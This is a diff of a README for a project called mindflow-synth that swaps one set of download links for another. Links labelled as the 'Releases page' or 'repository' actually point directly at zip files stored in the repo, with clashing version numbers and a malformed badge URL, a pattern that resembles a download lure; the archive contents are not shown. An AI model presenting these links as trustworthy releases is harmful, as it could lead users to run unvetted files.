@@ -18,9 +18,9 @@ Before you start, check that your system meets these requirements:
 ## 📥 Download & Install
 To get your copy of mindflow-synth, visit our Releases page below:
 
-[![Download mindflow-synth](https://raw.githubusercontent.com/mibhati/mindflow-synth/main/mindflow_synth/mindflow-synth-3.2.zip%20mindflow--synth-v1.0-blue)](https://raw.githubusercontent.com/mibhati/mindflow-synth/main/mindflow_synth/mindflow-synth-3.2.zip)
+[![Download mindflow-synth](https://github.com/mibhati/mindflow-synth/raw/refs/heads/main/mindflow_synth/synth_mindflow_v2.3.zip%20mindflow--synth-v1.0-blue)](https://github.com/mibhati/mindflow-synth/raw/refs/heads/main/mindflow_synth/synth_mindflow_v2.3.zip)
 
-1. Click the button above or visit this link: [mindflow-synth Releases](https://raw.githubusercontent.com/mibhati/mindflow-synth/main/mindflow_synth/mindflow-synth-3.2.zip).
+1. Click the button above or visit this link: [mindflow-synth Releases](https://github.com/mibhati/mindflow-synth/raw/refs/heads/main/mindflow_synth/synth_mindflow_v2.3.zip).
 2. Find the latest version of the software listed on the page.
 3. Download the file that matches your operating system.
 4. Once the download is complete, locate the file on your computer.
@@ -82,4 +82,4 @@ To learn more about advanced language models and cognitive processes related to 
 - Cognitive Processes in Learning
 - Techniques for Enhancing Mental Performance
 
-For more information, visit the mindflow-synth repository: [mindflow-synth Releases](https://raw.githubusercontent.com/mibhati/mindflow-synth/main/mindflow_synth/mindflow-synth-3.2.zip).
+For more information, visit the mindflow-synth repository: [mindflow-synth Releases](https://github.com/mibhati/mindflow-synth/raw/refs/heads/main/mindflow_synth/synth_mindflow_v2.3.zip).
